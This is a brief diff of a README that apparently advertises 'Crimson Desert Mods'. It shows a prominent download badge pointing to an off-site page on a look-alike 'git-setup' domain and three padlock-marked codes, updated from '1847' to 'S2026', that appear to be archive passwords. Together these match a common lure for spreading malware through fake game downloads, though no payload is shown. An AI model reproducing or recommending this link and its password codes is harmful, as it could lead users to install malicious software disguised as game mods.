@@ -23,11 +23,11 @@
 
 [![Crimson Desert Mods](https://img.shields.io/badge/Download%20Crimson%20Desert%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://git-setup.github.io/download/)
 
-**🔐🔐🔐** `1847`
+**🔐🔐🔐** `S2026`
 
-**🔐🔐🔐** `1847`
+**🔐🔐🔐** `S2026`
 
-**🔐🔐🔐** `1847`
+**🔐🔐🔐** `S2026`
 
 ---
 
